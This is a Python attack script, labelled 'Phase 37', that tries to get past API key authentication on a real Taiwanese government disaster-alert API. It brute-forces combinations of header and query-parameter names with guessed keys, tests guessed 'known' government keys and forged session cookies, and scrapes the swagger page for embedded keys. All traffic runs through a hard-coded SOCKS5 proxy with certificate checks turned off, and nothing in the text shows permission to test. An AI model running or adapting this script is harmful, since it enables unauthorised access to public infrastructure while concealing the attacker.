#!/usr/bin/env python3
"""Phase 37: NCDR API key bypass - try all header/query param patterns."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
BASE = 'https://alerts.ncdr.nat.gov.tw/AddValueApi'

# Try various API key header names + query params
api_key_names = [
    'X-API-Key', 'X-Api-Key', 'api_key', 'apikey', 
    'Ocp-Apim-Subscription-Key', 'X-Subscription-Key',
    'Authorization', 'X-Auth-Token', 'X-Token',
    'X-NCDR-Key', 'X-Api-Key', 'ApiKey',
]

api_key_values = [
    'test', 'demo', '123456', 'admin', 'key', 'apikey',
    'NCDR', 'ncdr', 'AddValue', 'addvalue',
    'abcdef123456', 'guest', 'public',
]

print("=== API Key Header + Query Param brute force ===")
found = False
for name in api_key_names:
    for val in api_key_values:
        # Header
        headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', name: val}
        try:
            r = requests.get(f'{BASE}/EventCode', proxies=PROXY, headers=headers, verify=False, timeout=8)
            if r.status_code != 401:
                print(f"  HEADER {name}={val} -> {r.status_code} *** FOUND ***")
                print(f"    Body: {r.text[:300]}")
                found = True
        except:
            pass
        # Query param
        try:
            r = requests.get(f'{BASE}/EventCode', proxies=PROXY, params={name.lower(): val, 'apikey': val}, 
                           headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, verify=False, timeout=8)
            if r.status_code != 401:
                print(f"  QUERY {name.lower()}={val} -> {r.status_code} *** FOUND ***")
                print(f"    Body: {r.text[:300]}")
                found = True
        except:
            pass

if not found:
    print("  All header/query param combos returned 401")

# 2. Check swagger JSON for security schemes
print("\n=== Swagger security schemes ===")
r = requests.get(f'{BASE}/swagger/v1/swagger.json', proxies=PROXY, headers={'Accept': 'application/json'}, verify=False, timeout=15)
spec = r.json()

# Check securityDefinitions or components/securitySchemes
sec_defs = spec.get('securityDefinitions', spec.get('components', {}).get('securitySchemes', {}))
print(f"Security definitions: {json.dumps(sec_defs, indent=2, ensure_ascii=False)}")

# Check top-level security
top_sec = spec.get('security', [])
print(f"Top-level security: {top_sec}")

# Check per-endpoint security
for path, methods in spec.get('paths', {}).items():
    for method, info in methods.items():
        if isinstance(info, dict):
            sec = info.get('security', [])
            if sec:
                print(f"  {method.upper()} {path} security: {sec}")

# 3. Try common API key values from known government APIs
print("\n=== Known government API key patterns ===")
known_keys = [
    '0v1n35t6-3n57-t41b-3rv1-1n57v4t10n20',
    'c1286275-8927-421f-9434-9f5d8f8fc4be',
    'NCDR_OPEN_API',
    'AddValueApiKey',
]
for key in known_keys:
    r = requests.get(f'{BASE}/EventCode', proxies=PROXY, 
                    headers={'User-Agent': 'Mozilla/5.0', 'X-API-Key': key, 'Accept': 'application/json'},
                    verify=False, timeout=10)
    print(f"  X-API-Key={key} -> {r.status_code}: {r.text[:80]}")

# 4. Check if API key is embedded in swagger JS
print("\n=== Searching for API key in swagger HTML ===")
r = requests.get(f'{BASE}/swagger', proxies=PROXY, verify=False, timeout=15)
# Look for apiKey patterns
api_matches = re.findall(r'["\'](?:api[_-]?key|apikey|x-[^"]*)["\']\s*["\']?([^"\'{,<]+)', r.text, re.I)
print(f"  Potential key refs: {api_matches}")

# 5. Try the cookie-based auth
print("\n=== Cookie experiments ===")
cookies_to_try = [
    {'cookiesession1': 'test'},
    {'jwt': 'test'},
    {'token': 'test'},
    {'session': 'test'},
]
import re
for cookie in cookies_to_try:
    r = requests.get(f'{BASE}/EventCode', proxies=PROXY, cookies=cookie, verify=False, timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
    print(f"  Cookie={cookie} -> {r.status_code}: {r.text[:80]}")

print("\nDone.")
